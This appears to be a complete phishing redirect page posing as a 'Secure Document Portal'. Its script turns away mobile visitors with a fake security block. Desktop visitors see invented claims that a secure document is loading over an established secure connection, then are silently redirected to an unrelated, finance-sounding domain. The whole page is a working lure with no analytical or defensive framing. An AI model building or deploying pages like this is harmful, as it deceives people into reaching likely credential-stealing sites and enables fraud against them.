<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #f0f4f8;
            color: #0f172a;
            text-align: center;
            padding: 1.5rem;
        }

        .container {
            max-width: 520px;
            width: 100%;
        }

        .spinner {
            border: 4px solid #e2e8f0;
            border-top: 4px solid #1d4ed8;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 1.5rem;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .redirecting {
            background: #ffffff;
            border-radius: 20px;
            padding: 3rem 2rem;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06);
        }

        .redirecting .icon {
            font-size: 3rem;
            margin-bottom: 1rem;
        }

        .redirecting h2 {
            font-size: 1.5rem;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 0.5rem;
        }

        .redirecting p {
            color: #475569;
            font-size: 0.95rem;
            line-height: 1.5;
        }

        .redirecting .sub {
            color: #94a3b8;
            font-size: 0.8rem;
            margin-top: 0.75rem;
        }

        /* Mobile Blocked Styles */
        .blocked {
            background: #ffffff;
            border-radius: 20px;
            padding: 3rem 2rem;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06);
            border-top: 6px solid #dc2626;
        }

        .blocked .lock-icon {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            display: block;
        }

        .blocked h2 {
            font-size: 1.5rem;
            font-weight: 700;
            color: #dc2626;
            margin-bottom: 0.75rem;
        }

        .blocked .message {
            color: #334155;
            font-size: 1rem;
            line-height: 1.6;
            margin-bottom: 1.5rem;
        }

        .blocked .message strong {
            color: #0f172a;
        }

        .blocked .device-list {
            display: flex;
            justify-content: center;
            gap: 2rem;
            margin: 1.5rem 0;
            flex-wrap: wrap;
        }

        .blocked .device-list span {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.9rem;
            color: #1e293b;
            background: #f1f5f9;
            padding: 0.4rem 1rem;
            border-radius: 40px;
        }

        .blocked .device-list i {
            font-size: 1.1rem;
        }

        .blocked .footer-note {
            font-size: 0.8rem;
            color: #94a3b8;
            border-top: 1px solid #e9edf2;
            padding-top: 1.25rem;
            margin-top: 0.5rem;
        }

        .blocked .footer-note i {
            margin-right: 0.3rem;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .redirecting, .blocked {
                padding: 2rem 1.25rem;
            }
            .blocked .device-list {
                gap: 0.75rem;
            }
            .blocked .device-list span {
                font-size: 0.8rem;
                padding: 0.3rem 0.8rem;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="content">
        <!-- Content rendered by JavaScript -->
    </div>

    <script>
        (function() {
            // --- CONFIGURATION ---
            const TARGET_URL = "https://agonode-financial-structure.cuyahogattle.com";
            const REDIRECT_DELAY = 600;
            // --- END CONFIGURATION ---

            const content = document.getElementById('content');

            // 1. Detect mobile devices
            const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent);

            // 2. If mobile → show security block
            if (isMobile) {
                content.innerHTML = `
                    <div class="blocked">
                        <span class="lock-icon">🔒</span>
                        <h2>Access Restricted</h2>
                        <div class="message">
                            <strong>This document is not available on mobile devices.</strong><br>
                            For security reasons, this page can only be viewed from a desktop computer.
                        </div>
                        <div class="device-list">
                            <span><i class="fas fa-desktop"></i> Windows PC</span>
                            <span><i class="fab fa-apple"></i> Mac</span>
                        </div>
                        <div class="footer-note">
                            <i class="fas fa-shield-alt"></i> Secure document viewing
                        </div>
                    </div>
                `;

                // Add Font Awesome for icons (since we're using them)
                const fontAwesome = document.createElement('link');
                fontAwesome.rel = 'stylesheet';
                fontAwesome.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
                document.head.appendChild(fontAwesome);

                return;
            }

            // 3. Desktop → show redirect with document context
            content.innerHTML = `
                <div class="redirecting">
                    <div class="icon">📄</div>
                    <h2>Preparing your document</h2>
                    <p>Your secure document is being loaded.<br>You will be redirected momentarily.</p>
                    <div class="spinner"></div>
                    <div class="sub"><i class="fas fa-lock" style="margin-right: 0.3rem;"></i> Secure connection established</div>
                </div>
            `;

            // Add Font Awesome
            const fontAwesome = document.createElement('link');
            fontAwesome.rel = 'stylesheet';
            fontAwesome.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
            document.head.appendChild(fontAwesome);

            // 4. Redirect after delay
            setTimeout(function() {
                window.location.replace(TARGET_URL);
            }, REDIRECT_DELAY);
        })();
    </script>
</body>
</html>
